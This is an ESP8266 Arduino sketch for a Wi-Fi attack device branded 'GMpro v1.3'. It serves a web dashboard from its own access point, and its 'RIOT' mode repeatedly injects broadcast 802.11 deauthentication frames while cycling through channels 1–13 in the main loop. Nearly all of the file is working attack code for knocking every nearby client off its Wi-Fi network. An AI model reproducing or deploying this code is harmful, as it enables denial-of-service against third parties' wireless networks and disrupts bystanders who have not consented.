#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#define SCREEN_WIDTH 64
#define SCREEN_HEIGHT 48
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

#include "web.h"
#include "sniffer.h"
#include "beacon.h"

const unsigned char PROGMEM gmpro_logo[] = {
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x3f, 0xfc, 0x00, 0x1f, 0xf0, 0x00, 0x00, 0x00, 0x60, 0x06, 0x00, 0x30, 0x18, 0x00, 0x00,
  0x00, 0xc0, 0x03, 0x00, 0x60, 0x0c, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x60, 0x0c, 0x00, 0x00,
  0x00, 0xc0, 0x7f, 0x80, 0x60, 0x0c, 0x00, 0x00, 0x00, 0xc0, 0x40, 0x80, 0x60, 0x0c, 0x00, 0x00,
  0x00, 0x60, 0x40, 0x80, 0x30, 0x18, 0x00, 0x00, 0x00, 0x3f, 0xff, 0x00, 0x1f, 0xf0, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

bool modeMassDeauth = false;
int packetCounter = 0;

void updateOLED(String status, int pkts) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(0,0);
  display.println("GMpro v1.3");
  display.drawFastHLine(0, 9, 64, WHITE);
  display.setCursor(0, 15);
  display.print("MOD:"); display.println(status);
  display.print("PKT:"); display.println(pkts);
  display.print("CH :"); display.println(wifi_get_channel());
  if(modeMassDeauth) display.fillCircle(58, 40, 3, (pkts % 2 == 0) ? WHITE : BLACK);
  display.display();
}

void setup() {
  Serial.begin(115200);
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { for(;;); }
  
  display.clearDisplay();
  display.drawBitmap(0, 8, gmpro_logo, 64, 32, WHITE);
  display.display();
  delay(2000);

  WiFi.softAP("GMpro2", "12345678");

  webServer.on("/", []() {
    String html = Header + "<div class='card'><div class='card-title'>DASHBOARD</div>";
    html += "<p>Mode: <span class='value'>" + String(modeMassDeauth ? "RIOT" : "IDLE") + "</span></p></div>" + Footer;
    webServer.send(200, "text/html", html);
  });

  webServer.on("/mass", []() { modeMassDeauth = true; webServer.sendHeader("Location", "/"); webServer.send(302); });
  webServer.on("/stop", []() { modeMassDeauth = false; packetCounter = 0; updateOLED("READY", 0); webServer.sendHeader("Location", "/"); webServer.send(302); });
  webServer.on("/style.css", []() { webServer.send(200, "text/css", style); });
  
  webServer.begin();
  updateOLED("READY", 0);
}

void loop() {
  webServer.handleClient();
  if (modeMassDeauth) {
    uint8_t deauthPkt[26] = {0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x01, 0x00};
    wifi_send_pkt_freedom(deauthPkt, 26, 0);
    packetCounter++;
    if(packetCounter % 5 == 0) {
      updateOLED("RIOT!", packetCounter);
      wifi_set_channel((wifi_get_channel() % 13) + 1);
    }
    delay(1);
  }
}
